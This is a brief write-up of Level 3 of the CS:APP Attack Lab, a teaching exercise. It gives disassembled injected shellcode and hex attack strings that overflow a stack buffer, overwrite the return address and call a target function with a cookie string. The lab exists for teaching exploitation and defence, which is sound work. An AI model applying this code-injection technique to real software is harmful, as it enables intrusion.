# CS:APP Attacklab Writeup
## Level 3
First, I tried to store the string in the buffer:
```
   0:	48 c7 c7 97 dc 61 55 	mov    $0x5561dc97,%rdi
   7:	68 fa 18 40 00       	push   $0x4018fa
   c:	c3                   	ret
   d:	90                   	nop
```

```
48 c7 c7 97 dc 61 55
68 fa 18 40 00
c3
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 
11 45 
35 39 62 39 39 37 66 61 00 /* This is the target string */
78 DC 61 55 /* This is the target of return */
```

However, the instructions in string compare functions also uses this stack spaces.

By creating extra stack space, we can keep this string in memory:

```
   0:	6a 00                	push   $0x0
   2:	48 bf 35 39 62 39 39 	movabs $0x6166373939623935,%rdi
   9:	37 66 61 
   c:	57                   	push   %rdi
   d:	48 89 e7             	mov    %rsp,%rdi
  10:	68 fa 18 40 00       	push   $0x4018fa
  15:	c3                   	ret
  16:	90                   	nop
```

Therefore, we can devise the attack string:
```
6a 00 
48 bf 35 39 62 39 39
37 66 61 
57  

48 89 e7
68 fa 18 40 00
c3
11 45 
11 45 14 11 45 14
11 
35 39 62 39 39 37 66 61 00 /* This is the target string, but of no use */
78 DC 61 55 /* This is the target of return */
```